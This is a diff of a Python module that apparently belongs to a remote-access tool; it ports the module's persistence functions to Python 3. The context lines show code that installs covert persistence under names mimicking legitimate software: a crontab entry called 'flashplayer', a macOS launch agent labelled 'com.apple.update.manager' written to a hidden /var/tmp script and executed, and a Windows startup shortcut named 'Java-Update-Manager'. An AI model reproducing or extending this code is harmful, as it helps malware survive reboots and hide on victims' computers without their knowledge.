@@ -137,7 +137,7 @@ def _add_crontab_job(value=None, minutes=10, name='flashplayer'):
                     with open('/etc/crontab', 'r') as fp:
                         data = fp.read()
                     if task not in data:
-                        with file('/etc/crontab', 'a') as fd:
+                        with open('/etc/crontab', 'a') as fd:
                             fd.write('\n' + task + '\n')
                     return (True, path)
                 else:
@@ -162,7 +162,7 @@ def _add_launch_agent(value=None, name='com.apple.update.manager'):
                     os.makedirs('/var/tmp')
                 fpath = '/var/tmp/.{}.sh'.format(name)
                 bash = globals()['__Template_plist'].replace('__LABEL__', label).replace('__FILE__', value)
-                with file(fpath, 'w') as fileobj:
+                with open(fpath, 'w') as fileobj:
                     fileobj.write(bash)
                 bin_sh = bytes().join(subprocess.Popen('/bin/sh {}'.format(fpath), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                 time.sleep(1)
@@ -202,7 +202,7 @@ def _add_startup_file(value=None, name='Java-Update-Manager'):
                 startup_file = os.path.join(startup_dir, '%s.eu.url' % name)
                 content = '\n[InternetShortcut]\nURL=file:///%s\n' % value
                 if not os.path.exists(startup_file) or content != open(startup_file, 'r').read():
-                    with file(startup_file, 'w') as fp:
+                    with open(startup_file, 'w') as fp:
                         fp.write(content)
                 return (True, startup_file)
     except Exception as e:
@@ -395,4 +395,3 @@ def abort():
                 method.remove()
             except Exception as e:
                 util.log(e)
-
